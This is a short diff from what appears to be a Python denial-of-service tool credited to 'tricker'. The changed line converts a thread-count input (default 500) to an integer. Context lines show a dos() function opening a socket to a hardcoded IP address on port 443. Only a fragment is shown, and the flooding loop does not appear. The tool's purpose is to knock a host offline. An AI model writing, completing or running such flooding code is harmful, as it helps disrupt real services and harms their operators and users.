@@ -16,7 +16,7 @@ print('made by tricker')
 print('\033[0m')
 
 url = input('url :')
-thread = input('thread(default 500) :')
+thread = int(input('thread(default 500) :'))
 
 def dos():
     s.connect(('145.14.145.147', 443))
